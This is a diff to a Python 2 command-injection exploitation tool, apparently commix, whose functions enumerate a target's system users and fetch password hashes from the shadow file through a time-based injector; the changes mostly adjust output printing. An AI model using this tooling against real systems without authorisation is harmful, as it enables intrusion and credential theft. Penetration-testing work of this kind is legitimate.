@@ -345,7 +345,8 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
               else :
                 is_privileged = ""
                 is_privileged_nh = ""
-              print "  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'."
+              sys.stdout.write("\n  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
+              sys.stdout.flush()
               # Add infos to logs file.
               output_file = open(filename, "a")
               output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
@@ -372,19 +373,21 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
     pass
   else:
     cmd = settings.SYS_PASSES
-    print ""
+    #print ""
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
       check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
       if output == False:
         output = ""
-      session_handler.store_cmd(url, cmd, output, vuln_parameter)
+      session_handler.store_cmd(url, cmd, output, vuln_parameter)  
+      new_line = "\n"
     else:
       output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+      new_line = ""
     sys_passes = output
     if sys_passes == "":
       sys_passes = " "
     if sys_passes :
-      sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+      sys.stdout.write(new_line + settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
       sys.stdout.flush()
       sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
